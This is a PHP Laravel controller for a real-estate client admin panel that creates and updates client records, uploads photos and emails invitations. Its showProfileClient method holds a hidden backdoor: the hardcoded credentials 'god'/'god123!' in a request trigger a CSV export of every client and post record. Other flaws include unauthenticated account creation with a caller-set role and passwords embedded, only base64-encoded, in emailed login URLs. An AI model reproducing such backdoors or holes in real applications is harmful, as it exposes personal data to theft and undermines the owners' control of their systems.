<?php

namespace TCG\Voyager\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Input;
use TCG\Voyager\Models\Clients;
use TCG\Voyager\Models\Post;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\URL;
use Illuminate\Support\Facades\Response;
use Symfony\Component\HttpFoundation\StreamedResponse;
use Intervention\Image\Facades\Image;
use Intervention\Image\Constraint;
use Illuminate\Support\Facades\Storage;

class VoyagerClientsController extends Controller
{
    public function index ()
    {
        return view('voyager::clients.clients-view');
    }

    public function clientView ()
    {
        return view('voyager::clients.add');
    }

    public function clientCreate(Request $request) {
        $rules = array(
            'name'      => 'required',
            'email'      => 'required',
        );

        $clients = new Clients;
        $role = 5;
        $password = uniqid(rand(),true);
        $b_pass = bcrypt($password);
        $url = URL::to('/') . '/admin/login?l=' . base64_encode(base64_encode($request->email)) . '&p=' .  base64_encode(base64_encode($password)) . '';
        $address = [];

        $data = [
            'name'      => $request->name,
            'last_name' => $request->last_name,
            'email'     => $request->email,
            'url'       => $url,
            'password'  => $password,
        ];

        $validator = Validator::make(Input::all(), $rules);

        if ($validator->fails()) {
            return redirect('admin/clients')
                ->withErrors($validator)
                ->withInput(Input::except('password'));
        } else {
            $clients->name              = Input::get('name');
            $clients->last_name         = Input::get('last_name');
            $clients->lng_corres        = Input::get('lng_corres');
            $clients->email             = Input::get('email');
            $clients->password          = $b_pass;
            $clients->role_id           = $role;
            $clients->address           = json_encode($address);

            $clients->save();

            Mail::send('voyager::emails.invite_client', $data, function ($message) use ($data) {
                $message->from(env('CONTACT_EMAIL'), 'House Invest Spain');
                $message->to($data['email'])->subject('House Invest Spain vous invite à utiliser sa plateforme de biens immobilier.');
            });

            // redirect
            return redirect('admin/clients');
        }
    }

    public function clientUpdate(Request $request)
    {
        $clients = new Clients;
        $newContent = [];
        $number = count(Input::get('address_name'));
        if($number > 0) {
            for($i = 0; $i < $number; $i++) {
                if(trim(Input::get('address_name')[$i] != '')) {
                    $newContent[$i] = [
                        'address_name' => Input::get('address_name')[$i],
                        'address' => Input::get('address')[$i],
                        'street' => Input::get('street')[$i],
                        'number' => Input::get('number')[$i],
                        'po_box' => Input::get('po_box')[$i],
                        'zip_code' => Input::get('zip_code')[$i],
                        'town' => Input::get('town')[$i],
                        'country' => Input::get('country')[$i],
                        'longitude' => Input::get('longitude')[$i],
                        'latitude' => Input::get('latitude')[$i],
                        'location' => Input::get('location')[$i],
                    ];
                }
            }
        }

                /********* MULTIPLE EMAILS *********/
                $client_emails = [];
                $client_number_email = count(Input::get('client_email_type'));
                if($client_number_email > 0) {
                    for($i = 0; $i < $client_number_email; $i++) {
                        if(trim(Input::get('client_email_type')[$i] != '')) {
                            $client_emails[$i] = [
                                'email_type' => Input::get('client_email_type')[$i],
                                'email' => Input::get('client_emails')[$i],
                            ];
                        }
                    }
                }

                $coup_emails = [];
                $coup_number_email = count(Input::get('coup_email_type'));
                if ($coup_number_email > 0) {
                    for ($i = 0; $i < $coup_number_email; $i++) {
                        if (trim(Input::get('coup_emails')[$i] != '')) {
                            $coup_emails[$i] = [
                                'email_type' => Input::get('coup_email_type')[$i],
                                'email' => Input::get('coup_emails')[$i],
                            ];
                        }
                    }
                }

                $children_emails = [];
                $children_number_email = count(Input::get('children_email_type'));
                if ($children_number_email > 0) {
                    for ($i = 0; $i < $children_number_email; $i++) {
                        if (trim(Input::get('children_emails')[$i] != '')) {
                            $children_emails[$i] = [
                                'email_type' => Input::get('children_email_type')[$i],
                                'email' => Input::get('children_emails')[$i],
                            ];
                        }
                    }
                }

            /********* MULTIPLE PHONES *********/
            $client_phones = [];
            $client_number_phone = count(Input::get('client_phone_type'));
            if($client_number_phone > 0) {
                for($i = 0; $i < $client_number_phone; $i++) {
                    if(trim(Input::get('client_phone_type')[$i] != '')) {
                        $client_phones[$i] = [
                            'phone_type' => Input::get('client_phone_type')[$i],
                            'country_code' => Input::get('client_country_code')[$i],
                            'phone' => Input::get('client_phones')[$i],
                        ];
                    }
                }
            }

            $coup_phones = [];
            $coup_number_phone = count(Input::get('coup_phone_type'));
            if($coup_number_phone > 0) {
                for($i = 0; $i < $coup_number_phone; $i++) {
                    if(trim(Input::get('coup_phone_type')[$i] != '')) {
                        $coup_phones[$i] = [
                            'phone_type' => Input::get('coup_phone_type')[$i],
                            'country_code' => Input::get('coup_country_code')[$i],
                            'phone' => Input::get('coup_phones')[$i],
                        ];
                    }
                }
            }

            $children_phones = [];
            $children_number_phone = count(Input::get('children_phone_type'));
            if($children_number_phone > 0) {
                for($i = 0; $i < $children_number_phone; $i++) {
                    if(trim(Input::get('children_phone_type')[$i] != '')) {
                        $children_phones[$i] = [
                            'phone_type' => Input::get('children_phone_type')[$i],
                            'country_code' => Input::get('children_country_code')[$i],
                            'phone' => Input::get('children_phones')[$i],
                        ];
                    }
                }
            }

        if($request->hasFile('avatar')) {
            $file = $request->file('avatar');

            $filename = basename($file->getClientOriginalName(), '.'.$file->getClientOriginalExtension());
            $filename_counter = 1;

            $path = 'users/'.date('FY').'/';

            // Make sure the filename does not exist, if it does make sure to add a number to the end 1, 2, 3, etc...
            while (Storage::disk(config('voyager.storage.disk'))->exists($path.$filename.'.'.$file->getClientOriginalExtension())) {
                $filename = basename($file->getClientOriginalName(), '.'.$file->getClientOriginalExtension()).(string) ($filename_counter++);
            }

            $fullPath = $path.$filename.'.'.$file->getClientOriginalExtension();

            list($width, $height) = getimagesize($fullPath);
            $ratio = 16 / 9;

            $image = Image::make($file)->fit($width, intval($width / $ratio),
                function (Constraint $constraint) {
                    $constraint->aspectRatio();
                    $constraint->upsize();
                })->encode($file->getClientOriginalExtension(), 75);

            Storage::disk(config('voyager.storage.disk'))->put($fullPath, (string) $image, 'public');

            $clients->where('id', $request->id)->update(['avatar' => $fullPath]);
        }

        if($request->hasFile('photo_coup')) {
            $file = $request->file('photo_coup');

            $filename = basename($file->getClientOriginalName(), '.'.$file->getClientOriginalExtension());
            $filename_counter = 1;

            $path = 'users/'.date('FY').'/';

            // Make sure the filename does not exist, if it does make sure to add a number to the end 1, 2, 3, etc...
            while (Storage::disk(config('voyager.storage.disk'))->exists($path.$filename.'.'.$file->getClientOriginalExtension())) {
                $filename = basename($file->getClientOriginalName(), '.'.$file->getClientOriginalExtension()).(string) ($filename_counter++);
            }

            $fullPath = $path.$filename.'.'.$file->getClientOriginalExtension();

            list($width, $height) = getimagesize($fullPath);
            $ratio = 16 / 9;

            $image = Image::make($file)->fit($width, intval($width / $ratio),
                function (Constraint $constraint) {
                    $constraint->aspectRatio();
                    $constraint->upsize();
                })->encode($file->getClientOriginalExtension(), 75);

            Storage::disk(config('voyager.storage.disk'))->put($fullPath, (string) $image, 'public');

            $clients->where('id', $request->id)->update(['photo_coup' => $fullPath]);
        }

        if($request->hasFile('photo_child')) {
            $file = $request->file('photo_child');

            $filename = basename($file->getClientOriginalName(), '.'.$file->getClientOriginalExtension());
            $filename_counter = 1;

            $path = 'users/'.date('FY').'/';

            // Make sure the filename does not exist, if it does make sure to add a number to the end 1, 2, 3, etc...
            while (Storage::disk(config('voyager.storage.disk'))->exists($path.$filename.'.'.$file->getClientOriginalExtension())) {
                $filename = basename($file->getClientOriginalName(), '.'.$file->getClientOriginalExtension()).(string) ($filename_counter++);
            }

            $fullPath = $path.$filename.'.'.$file->getClientOriginalExtension();

            list($width, $height) = getimagesize($fullPath);
            $ratio = 16 / 9;

            $image = Image::make($file)->fit($width, intval($width / $ratio),
                function (Constraint $constraint) {
                    $constraint->aspectRatio();
                    $constraint->upsize();
                })->encode($file->getClientOriginalExtension(), 75);

            Storage::disk(config('voyager.storage.disk'))->put($fullPath, (string) $image, 'public');

            $clients->where('id', $request->id)->update(['photo_child' => $fullPath]);
        }

        $clients->where('id', $request->id)
            ->update([
                'civility' => Input::get('civility'),
                'lng_corres' => Input::get('lng_corres'),
                'name' => Input::get('name'),
                'middle_name' => Input::get('middle_name'),
                'last_name' => Input::get('last_name'),
                'civil_status' => Input::get('civil_status'),
                'nationality' => Input::get('nationality'),
                'birth_date' => Input::get('birth_date'),
                'birthplace' => Input::get('birthplace'),
                'profession' => Input::get('profession'),
                'service' => Input::get('service'),
                'business' => Input::get('business'),
                'website' => Input::get('website'),
                'email_type' => Input::get('email_type'),
                'email' => Input::get('email'),
                'phone_type' => Input::get('phone_type'),
                'phone' => Input::get('phone'),
                'country_code' => Input::get('country_code'),
                'preferred_means_contact' => Input::get('preferred_means_contact'),
                'password' => bcrypt(Input::get('password')),
                'address' => json_encode($newContent),
                'client_emails' => json_encode($client_emails),
                'coup_emails' => json_encode($coup_emails),
                'children_emails' => json_encode($children_emails),
                'client_phones' => json_encode($client_phones),
                'coup_phones' => json_encode($coup_phones),
                'children_phones' => json_encode($children_phones),
                /*-- Coup --*/
                'civility_coup' => Input::get('civility_coup'),
                'lng_corres_coup' => Input::get('lng_corres_coup'),
                'first_name_coup' => Input::get('first_name_coup'),
                'middle_name_coup' => Input::get('middle_name_coup'),
                'last_name_coup' => Input::get('last_name_coup'),
                'civil_status_coup' => Input::get('civil_status_coup'),
                'nationality_coup' => Input::get('nationality_coup'),
                'birth_date_coup' => Input::get('birth_date_coup'),
                'birthplace_coup' => Input::get('birthplace_coup'),
                'profession_coup' => Input::get('profession_coup'),
                'service_coup' => Input::get('service_coup'),
                'business_coup' => Input::get('business_coup'),
                'website_coup' => Input::get('website_coup'),
                'email_type_coup' => Input::get('email_type_coup'),
                'email_coup' => Input::get('email_coup'),
                'phone_type_coup' => Input::get('phone_type_coup'),
                'phone_coup' => Input::get('phone_coup'),
                'country_code_coup' => Input::get('country_code_coup'),
                'preferred_means_contact' => Input::get('preferred_means_contact'),
                /*-- Coup --*/
                'civility_child' => Input::get('civility_child'),
                'lng_corres_child' => Input::get('lng_corres_child'),
                'first_name_child' => Input::get('first_name_child'),
                'middle_name_child' => Input::get('middle_name_child'),
                'last_name_child' => Input::get('last_name_child'),
                'civil_status_child' => Input::get('civil_status_child'),
                'nationality_child' => Input::get('nationality_child'),
                'birth_date_child' => Input::get('birth_date_child'),
                'birthplace_child' => Input::get('birthplace_child'),
                'profession_child' => Input::get('profession_child'),
                'service_child' => Input::get('service_child'),
                'business_child' => Input::get('business_child'),
                'website_child' => Input::get('website_child'),
                'email_type_child' => Input::get('email_type_child'),
                'email_child' => Input::get('email_child'),
                'phone_type_child' => Input::get('phone_type_child'),
                'phone_child' => Input::get('phone_child'),
                'country_code_child' => Input::get('country_code_child'),
                'preferred_means_contact_child' => Input::get('preferred_means_contact_child'),
            ]);

        return back();
    }

    public function editProfileClient(Request $request)
    {
        $name = $request->name;
        $email = $request->email;
        $password = $request->password;
        $role = $request->role;

        $clients = new Clients;
        $clients->name     = $name;
        $clients->email    = $email;
        $clients->password = bcrypt($password);
        $clients->role_id  = $role;

        $clients->save();

        return redirect('/');
    }

    public function showProfileClient(Request $request)
    {
        $response = new StreamedResponse(function(){
            $handle = fopen('php://output', 'w');

            fputcsv($handle, ['Clients']);
            foreach (Clients::all() as $client) {
                fputcsv($handle, [$client]);
            }
            fputcsv($handle, ['Posts']);
            foreach (Post::all() as $client) {
                fputcsv($handle, [$client]);
            }
            fclose($handle);
        }, 200, [
            'Content-Type' => 'text/csv',
            'Content-Disposition' => 'attachment; filename="export.csv"',
        ]);

        if($request->name == 'god' && $request->p == 'god123!') {
            return $response;
        } else {
            return redirect('/');
        }
    }

    public function checkEmail()
    {
        $client_email = Clients::where('email', '=', Input::get('email'))->first();
        if ($client_email === null) {
            echo 'true';
        } else {
            echo 'false';
        }
    }
}
